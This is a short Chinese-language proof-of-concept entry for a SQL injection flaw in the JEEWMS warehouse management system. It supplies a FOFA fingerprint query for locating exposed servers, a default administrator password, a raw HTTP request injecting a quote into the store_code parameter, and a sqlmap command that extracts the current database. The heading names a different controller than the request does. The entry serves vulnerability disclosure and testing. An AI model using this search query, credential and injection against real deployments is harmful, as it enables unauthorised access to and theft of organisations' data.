# JEEWMS系统cgReportController.do存在SQL注入漏洞

JEEWMS系统cgReportController.do存在SQL注入漏洞

## fofa

```javascript
body="plug-in/lhgDialog/lhgdialog.min.js?skin=metro"
```

## poc

默认密码 admin/llg123

```
GET /jeewms/graphReportController.do?datagridGraph&configId=CWSYL&store_code=1' HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest
```

```javascript
python sqlmap.py -u "http://localhost:8083/jeewms/graphReportController.do?datagridGraph&configId=CWSYL&store_code=1" --cookie="JSESSIONID=B0A3B7BC426F86462B08A69CA6F88FF9; JEECGINDEXSTYLE=ace; ZINDEXNUMBER=1990; Hm_lvt_a4980171086658b20eb2d9b523ae1b7b=1713256699,1713260101" -p store_code --current-db
```

![输入图片说明](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202502211400590.png)

## 漏洞来源

- [JEEWMS-graphReportController.do？# store_comde 中存在 SQL 注入漏洞 ·问题 #IBFK93 ·JeeWMS/JeeWMS - Gitee.com](https://gitee.com/erzhongxmu/JEEWMS/issues/IBFK93)

